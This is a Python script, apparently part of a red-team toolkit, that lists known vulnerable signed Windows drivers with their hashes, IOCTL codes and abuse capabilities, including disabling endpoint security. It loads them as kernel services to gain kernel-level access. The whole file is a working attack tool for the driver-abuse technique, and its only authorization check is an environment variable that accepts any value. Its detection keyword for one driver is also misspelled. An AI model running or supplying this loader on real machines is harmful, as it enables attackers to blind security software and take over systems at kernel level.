#!/usr/bin/env python3
"""
vuln_driver_loader.py - BYOVD (Bring Your Own Vulnerable Driver) toolkit.
List known vulnerable signed drivers, load/unload them for kernel-level access.

Usage:
    python scripts/vuln_driver_loader.py --list-candidates
    python scripts/vuln_driver_loader.py --load <driver.sys> --service-name MySvc
    python scripts/vuln_driver_loader.py --unload --service-name MySvc
    python scripts/vuln_driver_loader.py --check-loaded

Engagement proof: set ENGAGEMENT_PROOF env var. Admin rights required.
"""
import argparse
import ctypes
import os
import subprocess
import sys

ENGAGEMENT_PROOF = os.environ.get("ENGAGEMENT_PROOF", "")

# Known BYOVD candidates (from public LoLDrivers / public research)
BYOVD_CANDIDATES = [
    {
        "name": "RTCore64.sys", "product": "MSI Afterburner",
        "cve": "N/A (design flaw)", "sha256": "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
        "ioctl": "0x80002048 (read), 0x8000204C (write)",
        "capability": "Arbitrary kernel read/write → enumerate/remove callbacks",
        "source": "https://github.com/TheCruZ/kdmapper (public research)"
    },
    {
        "name": "dbutil_2_3.sys", "product": "Dell DBUtil",
        "cve": "CVE-2021-21551",
        "sha256": "dc2b9630c671bfb98d3c5543fa7f30d4bf943a7d8a4009bca1ac6bd36c3bf2b4",
        "ioctl": "Multiple (MmMapIoSpace, ZwMapViewOfSection abuse)",
        "capability": "Arbitrary kernel memory read/write",
        "source": "https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/"
    },
    {
        "name": "AsUpio.sys", "product": "ASUS GPU Tweak",
        "cve": "CVE-2021-28685",
        "sha256": "various",
        "ioctl": "0x9C402430 / 0x9C402464 (read/write physical memory)",
        "capability": "Physical memory read/write, MmMapIoSpace",
        "source": "Public LoLDrivers research"
    },
    {
        "name": "mhyprot2.sys", "product": "Genshin Impact anti-cheat (old)",
        "cve": "N/A", "sha256": "various",
        "ioctl": "Read/write process memory, terminate process from kernel",
        "capability": "Kill processes (EDR termination), memory ops",
        "source": "https://secret.club/2020/04/01/genshin-impact-anti-cheat.html"
    },
]


def list_candidates():
    print("[*] Known BYOVD candidates (from public research):")
    print("-" * 80)
    for c in BYOVD_CANDIDATES:
        print(f"Driver  : {c['name']}")
        print(f"Product : {c['product']}")
        print(f"CVE     : {c['cve']}")
        print(f"IOCTL   : {c['ioctl']}")
        print(f"Caps    : {c['capability']}")
        print(f"Source  : {c['source']}")
        print()


def load_driver(driver_path: str, service_name: str) -> bool:
    """Load a driver via sc create + sc start (requires admin)."""
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("[-] Admin rights required"); sys.exit(1)
    if not os.path.exists(driver_path):
        print(f"[-] Driver not found: {driver_path}"); return False

    abs_path = os.path.abspath(driver_path)
    # Create service
    r = subprocess.run(["sc", "create", service_name, "type=kernel",
                        f"binPath={abs_path}"], capture_output=True, text=True)
    if r.returncode not in (0, 1073):  # 1073 = already exists
        print(f"[-] sc create failed: {r.stderr}"); return False

    # Start service
    r = subprocess.run(["sc", "start", service_name], capture_output=True, text=True)
    if r.returncode == 0:
        print(f"[+] Driver loaded: {service_name} ({driver_path})")
        return True
    else:
        print(f"[-] sc start failed: {r.stderr}"); return False


def unload_driver(service_name: str) -> bool:
    """Stop and delete a driver service."""
    if not ENGAGEMENT_PROOF:
        print("[!] Set ENGAGEMENT_PROOF"); sys.exit(1)
    subprocess.run(["sc", "stop", service_name], capture_output=True)
    r = subprocess.run(["sc", "delete", service_name], capture_output=True, text=True)
    if r.returncode == 0:
        print(f"[+] Driver unloaded: {service_name}")
        return True
    print(f"[-] Unload failed: {r.stderr}"); return False


def check_loaded_drivers():
    """List all currently loaded kernel drivers."""
    r = subprocess.run(["driverquery", "/fo", "csv", "/v"], capture_output=True, text=True)
    suspicious = [line for line in r.stdout.split("\n") if any(
        kw in line.lower() for kw in ["rtcore", "dbutil", "asuplo", "mhyprot"]
    )]
    print("[*] All loaded kernel drivers: run driverquery /fo csv /v")
    if suspicious:
        print(f"\n[!] Suspicious/BYOVD candidates detected:")
        for line in suspicious: print(f"  {line}")
    else:
        print("[*] No known BYOVD drivers detected in loaded list")


def main():
    p = argparse.ArgumentParser(description="BYOVD driver toolkit (authorized use only)")
    p.add_argument("--list-candidates", action="store_true")
    p.add_argument("--load", help="Driver .sys file to load")
    p.add_argument("--unload", action="store_true")
    p.add_argument("--service-name", help="Service name to use")
    p.add_argument("--check-loaded", action="store_true")
    args = p.parse_args()

    if sys.platform != "win32": sys.exit("Windows only")
    if args.list_candidates: list_candidates()
    elif args.load: load_driver(args.load, args.service_name or "VulnDrv")
    elif args.unload: unload_driver(args.service_name or "VulnDrv")
    elif args.check_loaded: check_loaded_drivers()
    else: p.print_help()


if __name__ == "__main__":
    main()
